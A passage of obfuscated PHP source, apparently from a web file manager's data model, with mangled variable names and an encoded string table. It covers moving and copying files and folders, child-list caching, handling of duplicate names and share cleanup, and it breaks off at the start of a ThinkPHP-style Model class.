!$°±Ğ÷æ’[$½Ñş§ÊÅ[589]] || $°±Ğ÷æ’[$½Ñş§ÊÅ[589]] == $½Ñş§ÊÅ[191]) { $ôîİöæÁ[$½Ñş§ÊÅ[565]][] = array($½Ñş§ÊÅ[406], $Œ×«ºÓœ, $½Ñş§ÊÅ[589], short_id($Œ×«ºÓœ)); } if (Input::check($Ë¯°Ûæà, $½Ñş§ÊÅ[590])) { $ôîİöæÁ[$½Ñş§ÊÅ[564]][] = array($½Ñş§ÊÅ[406] => $Œ×«ºÓœ, $½Ñş§ÊÅ[93] => $½Ñş§ÊÅ[467], $½Ñş§ÊÅ[372] => str_replace($½Ñş§ÊÅ[50], $½Ñş§ÊÅ[33], Pinyin::get($Ë¯°Ûæà))); $ôîİöæÁ[$½Ñş§ÊÅ[564]][] = array($½Ñş§ÊÅ[406] => $Œ×«ºÓœ, $½Ñş§ÊÅ[93] => $½Ñş§ÊÅ[466], $½Ñş§ÊÅ[372] => Pinyin::get($Ë¯°Ûæà, $½Ñş§ÊÅ[591])); } $ôîİöæÁ[$½Ñş§ÊÅ[564]][] = array($½Ñş§ÊÅ[406] => $Œ×«ºÓœ, $½Ñş§ÊÅ[93] => $½Ñş§ÊÅ[445], $½Ñş§ÊÅ[372] => KodSort::makeStr($Ë¯°Ûæà)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($öâûıĞç) { $ã‡‘…‰Ç =& $_SERVER[Ù×¯Ø…]; $³¨°Øİ = $this->sourceInfo($öâûıĞç); $£×ØĞ‹µ = $ã‡‘…‰Ç[592]; $äı”é¬† = array($ã‡‘…‰Ç[524] => array($ã‡‘…‰Ç[547], $³¨°Øİ[$ã‡‘…‰Ç[524]] . $öâûıĞç . $ã‡‘…‰Ç[548]), $ã‡‘…‰Ç[434] => $this->targetIsDelete); $Ì§¤À­¬ = $this->field($£×ØĞ‹µ)->where($äı”é¬†)->select(); if (!$Ì§¤À­¬) { return; } $Ì§¤À­¬ = array_to_keyvalue($Ì§¤À­¬, $ã‡‘…‰Ç[406]); foreach ($Ì§¤À­¬ as $ü„·°Ö) { $ó•«©—“ = $ü„·°Ö[$ã‡‘…‰Ç[501]]; $öâûıĞç = $ü„·°Ö[$ã‡‘…‰Ç[406]]; if (!isset($this->_childrenListCache[$öâûıĞç]) && $ü„·°Ö[$ã‡‘…‰Ç[414]] == $ã‡‘…‰Ç[87]) { $this->_childrenListCache[$öâûıĞç] = array(); } if (!isset($this->_childrenListCache[$ó•«©—“])) { $this->_childrenListCache[$ó•«©—“] = array(); } $this->_childrenListCache[$ó•«©—“][$öâûıĞç] = $ü„·°Ö; $this->_childrenItemCache[$öâûıĞç] = $ü„·°Ö; } } private function _childrenListAll($ÑØ£§¦¬, &$ŸÑŞµÏµ) { $áÇšæ¨ =& $_SERVER[Ù×¯Ø…]; if (!isset($this->_childrenListCache[$ÑØ£§¦¬])) { return; } $™¸ˆíßñ = $this->_childrenListCache[$ÑØ£§¦¬]; foreach ($™¸ˆíßñ as $†ğ”±àä => $«¸ˆì“÷) { $ŸÑŞµÏµ[$†ğ”±àä] = $«¸ˆì“÷; if ($«¸ˆì“÷[$áÇšæ¨[414]] == $áÇšæ¨[87]) { $this->_childrenListAll($†ğ”±àä, $ŸÑŞµÏµ); } } } private function sourceInfoCache($¸Íıø¾Ç) { if (isset($this->_childrenItemCache[$¸Íıø¾Ç])) { return $this->_childrenItemCache[$¸Íıø¾Ç]; } return $this->sourceInfo($¸Íıø¾Ç); } private function _childrenList($ÌÒø³šõ) { if (isset($this->_childrenListCache[$ÌÒø³šõ])) { return $this->_childrenListCache[$ÌÒø³šõ]; } return $this->_childrenListSelect($ÌÒø³šõ); } private function _childrenListSelect($¯–ÆÊ¹ê) { $öÀµ—ù =& $_SERVER[Ù×¯Ø…]; $ˆ—Ÿ´Ø = array($öÀµ—ù[501] => $¯–ÆÊ¹ê, $öÀµ—ù[434] => $this->targetIsDelete); $ÍÚ€è§ = $this->where($ˆ—Ÿ´Ø)->select(); $ÍÚ€è§ = $ÍÚ€è§ ? $ÍÚ€è§ : array(); $áôæÇª· = array_to_keyvalue($ÍÚ€è§, $öÀµ—ù[406]); $this->_childrenListCache[$¯–ÆÊ¹ê] = $áôæÇª·; foreach ($áôæÇª· as $¯–ÆÊ¹ê => $‘ä÷˜ù) { $this->_childrenItemCache[$¯–ÆÊ¹ê] = $‘ä÷˜ù; } return $áôæÇª·; } private function fileNameExistCache($”Ÿ¶¿”ù, $™ï”ôÌ) { $ÆÉ„ôÕ =& $_SERVER[Ù×¯Ø…]; $™ï”ôÌ = strtolower($™ï”ôÌ); $²ñÄ°¤© = $this->_childrenList($”Ÿ¶¿”ù); foreach ($²ñÄ°¤© as $ò´ìßòÈ) { if ($™ï”ôÌ == strtolower($ò´ìßòÈ[$ÆÉ„ôÕ[28]])) { return $ò´ìßòÈ[$ÆÉ„ôÕ[406]]; } } return !1; } private function fileNameAutoCache($È€Ë»ù¬, $œì÷Ö¼Ì, $““ï€¥‰, $‰âáˆ‘Ë) { $ùÏã›ú =& $_SERVER[Ù×¯Ø…]; $ùÕ‹šâ€ = $this->_childrenList($È€Ë»ù¬); $µÓõİ = array_to_keyvalue($ùÕ‹šâ€, $ùÏã›ú[33], $ùÏã›ú[28]); return $this->fileNameAutoGet($µÓõİ, $œì÷Ö¼Ì, $““ï€¥‰, $‰âáˆ‘Ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($æ‘Ó¯ëó, $¼³ú‚Ï‰, $ı–×¶ä„ = REPEAT_REPLACE, $Ìƒ­ƒ½İ = '') { $™¬ı’Êß =& $_SERVER[Ù×¯Ø…]; $íø¸õÅ = $this->sourceInfo($æ‘Ó¯ëó); $Ñ¿œ°ší = $this->sourceInfo($¼³ú‚Ï‰); if ($íø¸õÅ[$™¬ı’Êß[501]] == $Ñ¿œ°ší[$™¬ı’Êß[406]]) { if ($íø¸õÅ[$™¬ı’Êß[434]] == $™¬ı’Êß[87]) { Model($™¬ı’Êß[432])->restore(array($æ‘Ó¯ëó)); } if (!$Ìƒ­ƒ½İ || $Ìƒ­ƒ½İ == $íø¸õÅ[$™¬ı’Êß[28]]) { return $æ‘Ó¯ëó; } } $Å­†¦ = $this->pathInfoMore($æ‘Ó¯ëó); if ($this->isParentOf($æ‘Ó¯ëó, $¼³ú‚Ï‰)) { return !1; } if (!$íø¸õÅ || !$Ñ¿œ°ší || $Ñ¿œ°ší[$™¬ı’Êß[414]] != $™¬ı’Êß[87]) { return !1; } Hook::trigger($™¬ı’Êß[593], $Å­†¦); $this->targetIsDelete = intval($íø¸õÅ[$™¬ı’Êß[434]]); if ($íø¸õÅ[$™¬ı’Êß[501]] == $¼³ú‚Ï‰ && $Ìƒ­ƒ½İ != $íø¸õÅ[$™¬ı’Êß[28]]) { $àş‘ä³Ğ = $this->fileNameExist($¼³ú‚Ï‰, $Ìƒ­ƒ½İ); if ($àş‘ä³Ğ && $íø¸õÅ[$™¬ı’Êß[414]] == $™¬ı’Êß[191]) { $£ô†œİİ = $this->sourceInfo($àş‘ä³Ğ); $ïÙ¯§•Í = $this->fileHistory($£ô†œİİ, $íø¸õÅ[$™¬ı’Êß[470]], $íø¸õÅ[$™¬ı’Êß[78]]); if (!$ïÙ¯§•Í) { Model($™¬ı’Êß[473])->remove($íø¸õÅ[$™¬ı’Êß[470]]); } $this->removeNow($æ‘Ó¯ëó, !1); $this->folderSizeReset($¼³ú‚Ï‰); Hook::trigger($™¬ı’Êß[594], $Å­†¦); return $àş‘ä³Ğ; } } $äï—ºÅ‘ = $Ìƒ­ƒ½İ ? $Ìƒ­ƒ½İ : $íø¸õÅ[$™¬ı’Êß[28]]; $this->lockMoveStart($æ‘Ó¯ëó); $this->lockWriteStart($¼³ú‚Ï‰, $äï—ºÅ‘); $±×ñ¶Û° = array($™¬ı’Êß[563] => array(), $™¬ı’Êß[595] => !1); $this->clearShare($æ‘Ó¯ëó, $¼³ú‚Ï‰); $Õ›ùØ¡ = $this->fileNameExistCache($¼³ú‚Ï‰, $íø¸õÅ[$™¬ı’Êß[28]]); $æô’Ã‡ = $this->_move($æ‘Ó¯ëó, $¼³ú‚Ï‰, $ı–×¶ä„, $±×ñ¶Û°, $Ìƒ­ƒ½İ); $this->sourceCacheClear(); if ($íø¸õÅ[$™¬ı’Êß[414]] == $™¬ı’Êß[87] && $Õ›ùØ¡) { $this->folderSizeResetChildren($æô’Ã‡); } Model($™¬ı’Êß[193])->linkAdd($±×ñ¶Û°[$™¬ı’Êß[563]]); if ($Õ›ùØ¡ && $±×ñ¶Û°[$™¬ı’Êß[595]]) { $this->removeNow($æ‘Ó¯ëó, !1); } $this->lockMoveEnd($æ‘Ó¯ëó); $this->lockWriteEnd($¼³ú‚Ï‰, $äï—ºÅ‘); $this->folderSizeReset($íø¸õÅ[$™¬ı’Êß[501]]); $this->folderSizeReset($¼³ú‚Ï‰); $¿¦‚›æ = array($íø¸õÅ[$™¬ı’Êß[501]], $¼³ú‚Ï‰); if ($íø¸õÅ[$™¬ı’Êß[414]] == $™¬ı’Êß[87]) { $¿¦‚›æ[] = $æ‘Ó¯ëó; } $this->updateModifyTime($¿¦‚›æ); Model($™¬ı’Êß[567])->eventMove($æ‘Ó¯ëó, $íø¸õÅ[$™¬ı’Êß[501]], $¼³ú‚Ï‰); Hook::trigger($™¬ı’Êß[594], $Å­†¦); return $æô’Ã‡; } private function _move($ÂøµïØ, $õ¼‹åúß, $ï¾šğÅ, &$Ôİäúƒ†, $Ú­ğ¥ìü = '') { $³ØóàÇ© =& $_SERVER[Ù×¯Ø…]; $äó¦³ç€ = $this->sourceInfo($ÂøµïØ); $¡üÁ‚° = $äó¦³ç€[$³ØóàÇ©[414]] == $³ØóàÇ©[87]; $ôÅßñò = $Ú­ğ¥ìü ? $Ú­ğ¥ìü : $äó¦³ç€[$³ØóàÇ©[28]]; $ŒçŸäŞí = $this->fileNameExistCache($õ¼‹åúß, $ôÅßñò); $this->lockMoveStart($ÂøµïØ); $this->lockWriteStart($õ¼‹åúß, $ôÅßñò); if (!$ŒçŸäŞí) { return $this->_moveForce($ÂøµïØ, $õ¼‹åúß, $ôÅßñò); } $´—¾ËÀÉ = $ŒçŸäŞí; $«Ğ¼Û¡¯ = !1; if ($¡üÁ‚°) { if ($ï¾šğÅ == REPEAT_RENAME_FOLDER) { $ôÅßñò = $this->fileNameAuto($õ¼‹åúß, $ôÅßñò, $ï¾šğÅ, $¡üÁ‚°); $´—¾ËÀÉ = $this->_moveForce($ÂøµïØ, $õ¼‹åúß, $ôÅßñò); } else { if ($ï¾šğÅ == REPEAT_RENAME_FOLDER) { $ï¾šğÅ = REPEAT_RENAME; } $’˜§Ú¤ = $this->_childrenListSelect($ÂøµïØ); foreach ($’˜§Ú¤ as $›òä³à›) { $this->_move($›òä³à›[$³ØóàÇ©[406]], $ŒçŸäŞí, $ï¾šğÅ, $Ôİäúƒ†); } $«Ğ¼Û¡¯ = !0; } } else { if ($ï¾šğÅ == REPEAT_SKIP) { $«Ğ¼Û¡¯ = !0; } else { if ($ï¾šğÅ == REPEAT_RENAME || $ï¾šğÅ == REPEAT_RENAME_FOLDER) { $ôÅßñò = $this->fileNameAuto($õ¼‹åúß, $ôÅßñò, $ï¾šğÅ, $¡üÁ‚°); $´—¾ËÀÉ = $this->_moveForce($ÂøµïØ, $õ¼‹åúß, $ôÅßñò); } else { if ($ï¾šğÅ == REPEAT_REPLACE) { $ì›‰‡¤ = $this->sourceInfoCache($ŒçŸäŞí); $¢Š°·µª = $this->fileHistory($ì›‰‡¤, $äó¦³ç€[$³ØóàÇ©[470]], $äó¦³ç€[$³ØóàÇ©[78]]); $«Ğ¼Û¡¯ = !0; if ($¢Š°·µª) { $Ôİäúƒ†[$³ØóàÇ©[563]][] = $äó¦³ç€[$³ØóàÇ©[470]]; } } } } } if ($«Ğ¼Û¡¯ && !$Ôİäúƒ†[$³ØóàÇ©[595]]) { $Ôİäúƒ†[$³ØóàÇ©[595]] = !0; } return $´—¾ËÀÉ; } private function _moveForce($êÏĞæ“¦, $ş±‹¤Æ©, $“É¬‹Ï½) { $úŞ‰ì— =& $_SERVER[Ù×¯Ø…]; $îÈª¨ª = $this->sourceInfo($êÏĞæ“¦); $™¥ò¤ÓĞ = $this->sourceInfo($ş±‹¤Æ©); $ïàœçÒ = $îÈª¨ª[$úŞ‰ì—[414]] == $úŞ‰ì—[87]; $©¬˜½Â = array($úŞ‰ì—[405] => $™¥ò¤ÓĞ[$úŞ‰ì—[406]], $úŞ‰ì—[587] => $™¥ò¤ÓĞ[$úŞ‰ì—[524]] . $™¥ò¤ÓĞ[$úŞ‰ì—[406]] . $úŞ‰ì—[47], $úŞ‰ì—[583] => $™¥ò¤ÓĞ[$úŞ‰ì—[415]], $úŞ‰ì—[584] => $™¥ò¤ÓĞ[$úŞ‰ì—[507]], $úŞ‰ì—[586] => USER_ID, $úŞ‰ì—[424] => $“É¬‹Ï½); $úŸÈº¨¸ = $îÈª¨ª[$úŞ‰ì—[415]] == SourceModel::TYPE_GROUP && $™¥ò¤ÓĞ[$úŞ‰ì—[415]] == SourceModel::TYPE_GROUP && $îÈª¨ª[$úŞ‰ì—[507]] == $™¥ò¤ÓĞ[$úŞ‰ì—[507]]; if (!$úŸÈº¨¸ && $this->moveClearAuth) { Model($úŞ‰ì—[505])->authClear($êÏĞæ“¦); } $·ï³€¤Á = $îÈª¨ª[$úŞ‰ì—[434]] == $úŞ‰ì—[87] && $™¥ò¤ÓĞ[$úŞ‰ì—[434]] != $úŞ‰ì—[87]; if ($·ï³€¤Á) { $©¬˜½Â[$úŞ‰ì—[433]] = 0; } if ($ïàœçÒ) { $ÕâÛéÁ” = array($úŞ‰ì—[587] => array($úŞ‰ì—[547], $îÈª¨ª[$úŞ‰ì—[524]] . $îÈª¨ª[$úŞ‰ì—[406]] . $úŞ‰ì—[548])); $‚ô»¯×­ = $îÈª¨ª[$úŞ‰ì—[524]] . $îÈª¨ª[$úŞ‰ì—[406]] . $úŞ‰ì—[47]; $”Š²İ»Î = $™¥ò¤ÓĞ[$úŞ‰ì—[524]] . $™¥ò¤ÓĞ[$úŞ‰ì—[406]] . $úŞ‰ì—[47] . $îÈª¨ª[$úŞ‰ì—[406]] . $úŞ‰ì—[47]; $¶ÏŒà = array($úŞ‰ì—[587] => array($úŞ‰ì—[596], "\x72\145\160\154\x61\143\x65\50\x70\141\162\145\x6e\x74\x4c\145\x76\x65\154\54\x27{$‚ô»¯×­}\x27\54\x27{$”Š²İ»Î}\x27\x29"), $úŞ‰ì—[583] => $™¥ò¤ÓĞ[$úŞ‰ì—[415]], $úŞ‰ì—[584] => $™¥ò¤ÓĞ[$úŞ‰ì—[507]]); if ($·ï³€¤Á) { $¶ÏŒà[$úŞ‰ì—[433]] = 0; } $this->where($ÕâÛéÁ”)->data($¶ÏŒà)->save(); } $this->where(array($úŞ‰ì—[421] => $êÏĞæ“¦))->data($©¬˜½Â)->save(); return $êÏĞæ“¦; } private function clearShare($·Ø°ÎšÈ, $ù˜ÆØ¨Ô) { $ÆƒªÁçğ =& $_SERVER[Ù×¯Ø…]; $¥êøŞè = $this->sourceInfo($·Ø°ÎšÈ); $™œ¥ ³ = $this->sourceInfo($ù˜ÆØ¨Ô); if ($¥êøŞè[$ÆƒªÁçğ[507]] == $™œ¥ ³[$ÆƒªÁçğ[507]] && $¥êøŞè[$ÆƒªÁçğ[415]] == $ÆƒªÁçğ[597]) { return; } $äª¬Š½€ = array($ÆƒªÁçğ[524] => array($ÆƒªÁçğ[547], $¥êøŞè[$ÆƒªÁçğ[524]] . $·Ø°ÎšÈ . $ÆƒªÁçğ[548])); $üåàŞØ = $this->field($ÆƒªÁçğ[421])->where($äª¬Š½€)->getField($ÆƒªÁçğ[406], !0); if (!$üåàŞØ) { return; } $äª¬Š½€ = array($ÆƒªÁçğ[406] => array($ÆƒªÁçğ[7], $üåàŞØ), $ÆƒªÁçğ[498] => 1); $¿²æãÈÆ = Model($ÆƒªÁçğ[598])->field($ÆƒªÁçğ[491])->where($äª¬Š½€)->select(); if (!$¿²æãÈÆ) { return; } $¿²æãÈÆ = array_to_keyvalue($¿²æãÈÆ, $ÆƒªÁçğ[33], $ÆƒªÁçğ[491]); $äª¬Š½€ = array($ÆƒªÁçğ[491] => array($ÆƒªÁçğ[7], $¿²æãÈÆ)); Model($ÆƒªÁçğ[598])->where($äª¬Š½€)->save(array($ÆƒªÁçğ[498] => 0)); Model($ÆƒªÁçğ[599])->where($äª¬Š½€)->delete(); } public function copyFolderFromIO($Ò§ÈêöÂ, $âÔ­· —, $±À»ìÛ´, $Ù½ıÌˆù, $æ¥¨Ìï, $ìÈáÙñœ = false) { $†û–Óâ€ =& $_SERVER[Ù×¯Ø…]; $ø™½æéü = array($†û–Óâ€[564] => array(), $†û–Óâ€[565] => array(), $†û–Óâ€[563] => array(), $†û–Óâ€[600] => array()); $“í±Á•æ = $ìÈáÙñœ ? $ìÈáÙñœ : $Ò§ÈêöÂ->pathThis($âÔ­· —); $åå¨ØøÃ = $this->fileNameExist($±À»ìÛ´, $“í±Á•æ); $Í†ùĞÏ„ = $this->mkdir($±À»ìÛ´, $“í±Á•æ, $Ù½ıÌˆù); if (!$åå¨ØøÃ || $Ù½ıÌˆù == REPEAT_RENAME_FOLDER) { $Ù½ıÌˆù = !1; } if ($åå¨ØøÃ) { $this->_childrenAllMake($åå¨ØøÃ); } Hook::trigger($†û–Óâ€[601]); $this->_copyChildTo($Ò§ÈêöÂ, $âÔ­· —, $Í†ùĞÏ„, $Ù½ıÌˆù, $ø™½æéü, $æ¥¨Ìï); Hook::trigger($†û–Óâ€[602]); if ($Í†ùĞÏ„) { $this->folderSizeResetChildren($Í†ùĞÏ„); } $this->_childrenListClear(); Model($†û–Óâ€[566])->addAll($ø™½æéü[$†û–Óâ€[564]], array(), !0); Model($†û–Óâ€[567])->eventCopy($Í†ùĞÏ„); $this->saveAll($ø™½æéü[$†û–Óâ€[565]]); Model($†û–Óâ€[473])->linkAdd($ø™½æéü[$†û–Óâ€[563]]); Model($†û–Óâ€[473])->remove($ø™½æéü[$†û–Óâ€[600]]); $this->folderSizeReset($±À»ìÛ´); $this->updateModifyTime($±À»ìÛ´); return $Í†ùĞÏ„; } private function _copyChildTo($¶†îú—, $àæáÄà†, $…ù‚û£Å, $ö¹™ƒü¡, &$ƒÈÉ«ˆÂ, $ôìÚ¡İü) { $ŠĞÈóµ¿ =& $_SERVER[Ù×¯Ø…]; $íÌÌÄ‰ß = $this->sourceInfoCache($…ù‚û£Å); $êÎÏı°ï = $¶†îú—->listPath($àæáÄà†); $êÎÏı°ï = $êÎÏı°ï ? $êÎÏı°ï : array($ŠĞÈóµ¿[74] => array(), $ŠĞÈóµ¿[75] => array()); $â¸êÆû = array_merge($êÎÏı°ï[$ŠĞÈóµ¿[74]], $êÎÏı°ï[$ŠĞÈóµ¿[75]]); $—˜ûû¢‚ = $this->_addFiles($¶†îú—, $êÎÏı°ï[$ŠĞÈóµ¿[74]], $ôìÚ¡İü); $›ÀÓ’‹” = array(); foreach ($â¸êÆû as &$ıºöåØ) { if (isset($—˜ûû¢‚[$ıºöåØ[$ŠĞÈóµ¿[28]]])) { $ıºöåØ = $—˜ûû¢‚[$ıºöåØ[$ŠĞÈóµ¿[28]]]; } $ıºöåØ[$ŠĞÈóµ¿[414]] = $ıºöåØ[$ŠĞÈóµ¿[29]] == $ŠĞÈóµ¿[77]; $ıºöåØ[$ŠĞÈóµ¿[416]] = _get($ıºöåØ, $ŠĞÈóµ¿[168], $ŠĞÈóµ¿[33]); $ıºöåØ[$ŠĞÈóµ¿[78]] = _get($ıºöåØ, $ŠĞÈóµ¿[78], 0); $ıºöåØ[$ŠĞÈóµ¿[470]] = _get($ıºöåØ, $ŠĞÈóµ¿[470], 0); if (!isset($ıºöåØ[$ŠĞÈóµ¿[603]]) && $ıºöåØ[$ŠĞÈóµ¿[470]]) { $ƒÈÉ«ˆÂ[$ŠĞÈóµ¿[600]][] = $ıºöåØ[$ŠĞÈóµ¿[470]]; } if ($ö¹™ƒü¡) { $¥ó÷–œ™ = $this->fileNameExistCache($…ù‚û£Å, $ıºöåØ[$ŠĞÈóµ¿[28]]); if ($¥ó÷–œ™) { if ($ıºöåØ[$ŠĞÈóµ¿[414]] || $ö¹™ƒü¡ == REPEAT_SKIP) { continue; } if ($ö¹™ƒü¡ == REPEAT_REPLACE) { $¹¿Øï™Ï = $this->sourceInfoCache($¥ó÷–œ™); $Õø¿ÔõÅ = $this->fileHistory($¹¿Øï™Ï, $ıºöåØ[$ŠĞÈóµ¿[470]], $ıºöåØ[$ŠĞÈóµ¿[78]]); if ($Õø¿ÔõÅ) { $ƒÈÉ«ˆÂ[$ŠĞÈóµ¿[563]][] = $ıºöåØ[$ŠĞÈóµ¿[470]]; } continue; } else { if ($ö¹™ƒü¡ == REPEAT_RENAME) { $ıºöåØ[$ŠĞÈóµ¿[28]] = $this->fileNameAutoCache($…ù‚û£Å, $ıºöåØ[$ŠĞÈóµ¿[28]], $ö¹™ƒü¡, !1); } } } } if (!$ıºöåØ[$ŠĞÈóµ¿[414]] && $ıºöåØ[$ŠĞÈóµ¿[470]]) { $ƒÈÉ«ˆÂ[$ŠĞÈóµ¿[563]][] = $ıºöåØ[$ŠĞÈóµ¿[470]]; } $›ÀÓ’‹”[] = $this->_makeItemData($ıºöåØ, $íÌÌÄ‰ß, $ıºöåØ[$ŠĞÈóµ¿[28]]); } unset($ıºöåØ); if (!empty($›ÀÓ’‹”)) { $this->addAll($›ÀÓ’‹”); $this->_childrenListSelect($…ù‚û£Å); } $¥·İç“Ç = $this->_childrenList($…ù‚û£Å); $¥·İç“Ç = array_to_keyvalue($¥·İç“Ç, $ŠĞÈóµ¿[28]); foreach ($â¸êÆû as $ıºöåØ) { $¹¿Øï™Ï = $¥·İç“Ç[$ıºöåØ[$ŠĞÈóµ¿[28]]]; $²üÚÑ = $¹¿Øï™Ï[$ŠĞÈóµ¿[406]]; $this->_copyApplyMeta($¹¿Øï™Ï, $ƒÈÉ«ˆÂ); if ($ıºöåØ[$ŠĞÈóµ¿[29]] == $ŠĞÈóµ¿[77]) { $ıºöåØ[$ŠĞÈóµ¿[76]] = $¶†îú—->getPathInner($ıºöåØ[$ŠĞÈóµ¿[76]]); $this->_copyChildTo($¶†îú—, $ıºöåØ[$ŠĞÈóµ¿[76]], $²üÚÑ, $ö¹™ƒü¡, $ƒÈÉ«ˆÂ, $ôìÚ¡İü); } } } private function _addFiles($ÓÌÓö…¡, $áë–å±£, $ñ²‰¥ğŸ) { $ş›çƒİí =& $_SERVER[Ù×¯Ø…]; if (!$áë–å±£ || count($áë–å±£) == 0) { return array(); } $°Ü‚¦˜² = array(); foreach ($áë–å±£ as &$ÔÆ¿“å‹) { Hook::trigger($ş›çƒİí[604], $ÔÆ¿“å‹); $ÔÆ¿“å‹[$ş›çƒİí[76]] = $ÓÌÓö…¡->getPathInner($ÔÆ¿“å‹[$ş›çƒİí[76]]); $¹Â½ìÒß = $ÓÌÓö…¡->hashSimple($ÔÆ¿“å‹[$ş›çƒİí[76]]); $Ô—ŸˆÓ‹ = $ÓÌÓö…¡->hashMd5($ÔÆ¿“å‹[$ş›çƒİí[76]]); if (strlen($Ô—ŸˆÓ‹) > 10 && !isset($°Ü‚¦˜²[$Ô—ŸˆÓ‹])) { $°Ü‚¦˜²[$Ô—ŸˆÓ‹] = array(); } $ÔÆ¿“å‹[$ş›çƒİí[171]] = $¹Â½ìÒß; $ÔÆ¿“å‹[$ş›çƒİí[170]] = $Ô—ŸˆÓ‹; Hook::trigger($ş›çƒİí[605], $ÔÆ¿“å‹); $°Ü‚¦˜²[$Ô—ŸˆÓ‹][] =& $ÔÆ¿“å‹; if (count($°Ü‚¦˜²[$Ô—ŸˆÓ‹]) > 1) { $ÔÆ¿“å‹[$ş›çƒİí[603]] = !0; } } unset($ÔÆ¿“å‹); $®Ÿ´…È¥ = array($ş›çƒİí[170] => array($ş›çƒİí[7], array_keys($°Ü‚¦˜²))); $–Ì×ı¼Ò = Model($ş›çƒİí[606]); $¿° îõ = $–Ì×ı¼Ò->where($®Ÿ´…È¥)->select(); $¿° îõ = $¿° îõ ? $¿° îõ : array(); foreach ($¿° îõ as $ÙÀ•½€ş) { if (!isset($°Ü‚¦˜²[$ÙÀ•½€ş[$ş›çƒİí[170]]])) { continue; } $‰°ØÏÒ = $°Ü‚¦˜²[$ÙÀ•½€ş[$ş›çƒİí[170]]]; foreach ($‰°ØÏÒ as &$ÔÆ¿“å‹) { $ÔÆ¿“å‹[$ş›çƒİí[470]] = $ÙÀ•½€ş[$ş›çƒİí[470]]; $ÔÆ¿“å‹[$ş›çƒİí[603]] = !0; } unset($ÔÆ¿“å‹); } $×¡ÎĞÏ = array(); foreach ($áë–å±£ as $óû‰ê´) { if (isset($óû‰ê´[$ş›çƒİí[603]]) && $óû‰ê´[$ş›çƒİí[603]]) { continue; } $ŞÇ’ºÉĞ = $ÓÌÓö…¡->getPathInner($óû‰ê´[$ş›çƒİí[76]]); $ŞŠéû° = $–Ì×ı¼Ò->addFileMake($ŞÇ’ºÉĞ, $óû‰ê´[$ş›çƒİí[78]], $óû‰ê´[$ş›çƒİí[171]], $óû‰ê´[$ş›çƒİí[170]], $óû‰ê´[$ş›çƒİí[28]], $ñ²‰¥ğŸ); $×¡ÎĞÏ[] = $ŞŠéû°; } $–Ì×ı¼Ò->addAll($×¡ÎĞÏ); $®Ÿ´…È¥ = array($ş›çƒİí[170] => array($ş›çƒİí[7], array_keys($°Ü‚¦˜²))); $¿° îõ = $–Ì×ı¼Ò->where($®Ÿ´…È¥)->select(); $¿° îõ = $¿° îõ ? $¿° îõ : array(); foreach ($¿° îõ as $ÙÀ•½€ş) { if (!isset($°Ü‚¦˜²[$ÙÀ•½€ş[$ş›çƒİí[170]]])) { continue; } $ÄùÒœ¦ =& $°Ü‚¦˜²[$ÙÀ•½€ş[$ş›çƒİí[170]]]; foreach ($ÄùÒœ¦ as &$ÔÆ¿“å‹) { $ÔÆ¿“å‹[$ş›çƒİí[470]] = $ÙÀ•½€ş[$ş›çƒİí[470]]; } unset($ÔÆ¿“å‹); } $ÂŒ‚Ã = array(); foreach ($áë–å±£ as $İ¿„òå®) { $ÂŒ‚Ã[$İ¿„òå®[$ş›çƒİí[28]]] = $İ¿„òå®; } return $ÂŒ‚Ã; } } goto cÙâôØ©¯³; B…Ê‰”àŞ–: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\157\x72\x64\x65\x72", "\141\x6c\x69\x61\163", "\x68\x61\166\x69\156\147", "\x67\x72\157\x75\160", "\x6c\157\143\153", "\144\151\x73\x74\151\x6e\x63\164", "\x61\165\x74\x6f", "\146\151\154\x74\x65\162", "\166\141\154\x69\144\141\164\145", "\162\145\x73\x75\154\164", "\142\x69\x6e\144", "\x74\x6f\x6b\145\156"); public function __construct($•ŒÑš¢ä = '', $ï®¶õè = '', $ÄÏ”ˆåÅ = '') { $¥ã÷±®“ =& $_SERVER[Ù×¯Ø…]; $this->_initialize(); if (!empty($•ŒÑš¢ä)) { if (strpos($•ŒÑš¢ä, $¥ã÷±®“[95])) { list($this->dbName, $this->name) = explode($¥ã÷±®“[95], $•ŒÑš¢ä); } else { $this->name = $•ŒÑš¢ä; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ï®¶õè)) { $this->tablePrefix = $¥ã÷±®“[33]; } elseif ($¥ã÷±®“[33] != $ï®¶õè) { $this->tablePrefix = $ï®¶õè; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¥ã÷±®“[242]); } $this->db(0, empty($this->connection) ? $ÄÏ”ˆåÅ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ö¶£ñ‰€ =& $_SERVER[Ù×¯Ø…]; if (empty($this->fields)) { if (think_config($ö¶£ñ‰€[243])) { $¡‰öÈƒ = $this->dbName ? $this->dbName : think_config($ö¶£ñ‰€[244]); $ë÷úşöÉ = think_var_cache($ö¶£ñ‰€[245] . strtolower(get_path_this($¡‰öÈƒ) . $ö¶£ñ‰€[95] . $this->name)); if ($ë÷úşöÉ) { $ÚµÀœû½ = think_config($ö¶£ñ‰€[246]); if (empty($ÚµÀœû½) || $ë÷úşöÉ[$ö¶£ñ‰€[247]] == $ÚµÀœû½) { $this->fields = $ë÷úşöÉ; return; } } } $this->flush(); } } public function flush() { $É°»æÉ =& $_SERVER[Ù×¯Ø…]; $this->db->setModel($this->name); $ƒˆê–ß = $this->db->getFields($this->getTableName()); if (!$ƒˆê–ß) { return !1; } $this->fields = array_keys($ƒˆê–ß); $this->fields[$É°»æÉ[248]] = !1; foreach ($ƒˆê–ß as $ç†ä–ô¥ => $›Ïš€³ë) { $ú¹¡ëÕô[$ç†ä–ô¥] = $›Ïš€³ë[$É°»æÉ[29]]; if ($›Ïš€³ë[$É°»æÉ[36]]) { $this->fields[$É°»æÉ[249]] = $ç†ä–ô¥; if ($›Ïš€³ë[$É°»æÉ[39]]) { $this->fields[$É°»æÉ[248]] = !0; } } } $this->fields[$É°»æÉ[250]] = $ú¹¡ëÕô; if 